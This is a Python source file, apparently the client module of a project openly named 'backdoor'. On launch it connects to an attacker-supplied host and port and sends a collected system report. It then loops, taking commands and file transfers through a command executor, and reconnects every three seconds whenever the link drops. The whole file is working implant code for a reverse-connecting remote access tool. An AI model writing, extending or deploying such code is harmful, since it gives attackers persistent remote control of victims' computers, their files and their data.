from argparse import ArgumentParser, Namespace
import socket
import time

from backdoor.command.executor import CommandExecutor
from backdoor.files.io import FileReader, FileWriter
from backdoor.files.processor import FileProcessor
from backdoor.messages.exceptions import DisconnectedException
from backdoor.messages.exchange.client import ClientExchangeMapper
from backdoor.messages.messenger import SocketMessenger
from backdoor.messages.protocol import SocketProtocol
from backdoor.models.server import ServerModel
from backdoor.report.systemreport import SystemDataCollector
from backdoor.serialization.jsonserializer import JsonSerializer


DEFAULT_PORT = 4567


class Client:

    def __init__(
        self,
        messenger: SocketMessenger,
        exchanger: ClientExchangeMapper,
        data_collector: SystemDataCollector,
        host: str,
        port: int = 4567,
    ) -> None:
        self.host = host
        self.port = port
        self.messenger = messenger
        self.exchanger = exchanger
        self.data_collector = data_collector
        self.server: ServerModel

    def run(self) -> None:
        while True:
            try:
                self.__try_run()
            except (ConnectionRefusedError, DisconnectedException):
                # just keep trying to reconnect
                time.sleep(3)

    def __try_run(self) -> None:
        self.__establish_connection()
        self.__send_system_report()

        while True:
            self.exchanger.exchange(self.server)

    def __send_system_report(self) -> None:
        report = self.data_collector.collect_data()
        self.messenger.send(self.server.sock, report)

    def __establish_connection(self) -> None:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((self.host, self.port))
        self.server = ServerModel(host=self.host, port=self.port, sock=server)


def parse_args() -> Namespace:
    parser = ArgumentParser()
    parser.add_argument("-a", "--host", required=True)
    parser.add_argument("-p", "--port", required=False, default=DEFAULT_PORT, type=int)
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    protocol = SocketProtocol()
    serializer = JsonSerializer()
    messenger = SocketMessenger(protocol, serializer)
    file_reader = FileReader()
    file_writer = FileWriter()
    file_processor = FileProcessor(file_writer, file_reader)
    executor = CommandExecutor(file_processor)
    exchanger = ClientExchangeMapper(messenger, executor)
    data_collector = SystemDataCollector()
    client = Client(
        messenger, exchanger, data_collector, host=args.host, port=args.port
    )

    try:
        client.run()
    except KeyboardInterrupt:
        ...


if __name__ == "__main__":
    main()
